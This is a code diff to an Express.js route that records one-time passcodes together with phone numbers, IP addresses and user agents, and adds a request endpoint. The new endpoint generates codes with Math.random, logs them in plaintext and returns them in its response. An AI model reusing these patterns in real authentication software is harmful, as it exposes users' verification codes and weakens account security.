@@ -48,7 +48,8 @@ router.post('/log', async (req, res) => {
             otpCode,
             timestamp: timestamp || new Date().toISOString(),
             ip: req.ip || req.connection.remoteAddress,
-            userAgent: req.get('User-Agent') || 'Unknown'
+            userAgent: req.get('User-Agent') || 'Unknown',
+            action: 'verification'
         };
         
         // Add to memory
@@ -59,10 +60,24 @@ router.post('/log', async (req, res) => {
             otpLogs = otpLogs.slice(0, 1000);
         }
         
+        console.log(`OTP logged: ${phone} - ${otpCode} at ${logEntry.timestamp}`);
+        
+        // Update corresponding request status to 'verified' if it exists
+        const matchingRequest = otpLogs.find(log => 
+            log.phone === phone && 
+            log.otpCode === otpCode && 
+            log.action === 'request' && 
+            log.status === 'pending'
+        );
+        
+        if (matchingRequest) {
+            matchingRequest.status = 'verified';
+            matchingRequest.verifiedAt = logEntry.timestamp;
+            console.log(`Updated request ${matchingRequest.id} status to verified`);
+        }
+        
         // Save to file (async, don't wait)
         saveLogs().catch(err => console.error('Error saving logs:', err));
-        
-        console.log(`OTP logged: ${phone} - ${otpCode} at ${logEntry.timestamp}`);
         
         res.json({ 
             success: true, 
@@ -74,6 +89,59 @@ router.post('/log', async (req, res) => {
         console.error('Error logging OTP:', error);
         res.status(500).json({ 
             error: 'Internal server error while logging OTP' 
+        });
+    }
+});
+
+// POST /api/otp/request - Log OTP request (when user requests OTP)
+router.post('/request', async (req, res) => {
+    try {
+        const { phone, timestamp } = req.body;
+        
+        if (!phone) {
+            return res.status(400).json({ 
+                error: 'Phone number is required' 
+            });
+        }
+        
+        // Generate OTP for display purposes
+        const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+        
+        const requestEntry = {
+            id: Date.now().toString(),
+            phone,
+            otpCode,
+            timestamp: timestamp || new Date().toISOString(),
+            ip: req.ip || req.connection.remoteAddress,
+            userAgent: req.get('User-Agent') || 'Unknown',
+            action: 'request',
+            status: 'pending'
+        };
+        
+        // Add to memory
+        otpLogs.unshift(requestEntry); // Add to beginning for latest first
+        
+        // Keep only last 1000 entries to prevent memory issues
+        if (otpLogs.length > 1000) {
+            otpLogs = otpLogs.slice(0, 1000);
+        }
+        
+        // Save to file (async, don't wait)
+        saveLogs().catch(err => console.error('Error saving logs:', err));
+        
+        console.log(`OTP request logged: ${phone} - ${otpCode} at ${requestEntry.timestamp}`);
+        
+        res.json({ 
+            success: true, 
+            message: 'OTP request logged successfully',
+            otpCode: otpCode,
+            logId: requestEntry.id 
+        });
+        
+    } catch (error) {
+        console.error('Error logging OTP request:', error);
+        res.status(500).json({ 
+            error: 'Internal server error while logging OTP request' 
         });
     }
 });
